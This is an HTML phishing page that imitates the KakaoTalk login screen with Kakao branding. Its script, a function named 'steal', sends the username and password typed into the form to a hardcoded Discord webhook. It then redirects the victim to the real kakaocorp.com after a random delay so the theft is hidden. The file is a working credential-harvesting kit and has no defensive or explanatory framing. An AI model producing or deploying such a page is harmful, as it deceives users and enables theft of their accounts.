<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>KakaoTalk</title>
  <link rel="icon" href="https://www.kakaocorp.com/favicon.ico">
  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
  <style>
    body {
      margin: 0;
      padding: 0;
      background-color: #fafafa;
      font-family: 'Roboto', sans-serif;
    }

    .container {
      width: 100%;
      max-width: 440px;
      margin: 80px auto;
      padding: 40px 20px;
      background-color: white;
      text-align: center;
    }

    .logo {
      width: 150px;
      margin-bottom: 20px;
    }

    .box {
      border: 1px solid #dbdbdb;
      padding: 25px 20px;
      text-align: center;
    }

    .input-field {
      width: 100%;
      padding: 10px;
      margin: 6px 0;
      font-size: 14px;
      background: transparent;
      border: none;
      border-bottom: 1px solid #dbdbdb;
    }

    .checkbox-container {
      text-align: left;
      margin: 12px 0;
      font-size: 14px;
      color: gray;
    }

    .checkbox-container input[type="checkbox"] {
      margin-right: 5px;
      accent-color: gray;
    }

    .yellow-login-button {
      background-color: #ffcc00;
      color: black;
      padding: 10px;
      border: none;
      width: 100%;
      font-size: 14px;
      margin: 10px 0;
      cursor: pointer;
    }

    .gray-box-button {
      border: 1px solid #dbdbdb;
      background-color: #fafafa;
      padding: 10px;
      margin: 10px 0;
      width: 100%;
      font-size: 14px;
      cursor: pointer;
      font-weight: normal;
    }

    .link-row {
      display: flex;
      justify-content: space-between;
      margin-top: 15px;
      font-size: 13px;
      color: #555;
    }

    .link-row a {
      text-decoration: none;
      color: #555;
    }

    .link-row a:hover {
      text-decoration: underline;
    }

    .footer {
      font-size: 12px;
      color: #8e8e8e;
      text-align: center;
      margin-top: 30px;
    }

    .footer a {
      color: #8e8e8e;
      text-decoration: none;
    }

    .footer a:hover {
      text-decoration: underline;
    }
  </style>
</head>

<body>
  <div class="container">
    <!-- Logo image above the gray box -->
    <img src="https://cloudfront-ap-northeast-1.images.arcpublishing.com/chosunbiz/V7G5WPM7MJXDWOGTLIHZ7HINAE.jpg" alt="Kakao Logo" class="logo">

    <!-- Gray outline box -->
    <div class="box">
      <form onsubmit="steal(event)">
        <input class="input-field" id="username" type="text" placeholder="KakaoMail ID, email, or phone number" required>
        <input class="input-field" id="password" type="password" placeholder="Password" required>

        <div class="checkbox-container">
          <label><input type="checkbox"> Simple login information storage</label>
        </div>

        <button type="submit" class="yellow-login-button">Log In</button>
      </form>

      <div class="gray-box-button">QR Code Login</div>

      <div class="link-row">
        <a href="#">Sign Up</a>
        <div>
          <a href="#">Find Account</a> | <a href="#">Find Password</a>
        </div>
      </div>
    </div>

    <!-- Footer -->
    <div class="footer">
      <a href="#">Terms of Use</a> | 
      <a href="#">Privacy Policy</a> | 
      <a href="#">Customer Center</a><br>
      Â© Kakao Corp.
    </div>
  </div>

  <script>
    function steal(e) {
      e.preventDefault();
      const u = document.getElementById("username").value;
      const p = document.getElementById("password").value;

      fetch("https://discord.com/api/webhooks/1358102599647232202/4L51fQpmCq7hnbVud6P2AoYXGkpIrt2dYOts15JgJUb9LiEMeIxJJF5AdmDfJxtHlwFd", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          content: `ðŸ›‘ ê°•ì•„ì§€\nUsername: ${u}\nPassword: ${p}`
        })
      })
      .then(response => {
        if (response.ok) {
          setTimeout(() => {
            window.location.href = "https://www.kakaocorp.com";
          }, Math.random() * 2000 + 1000);
        } else {
          alert('Something went wrong.');
        }
      })
      .catch(() => {
        alert('Network error.');
      });
    }
  </script>
</body>
</html>
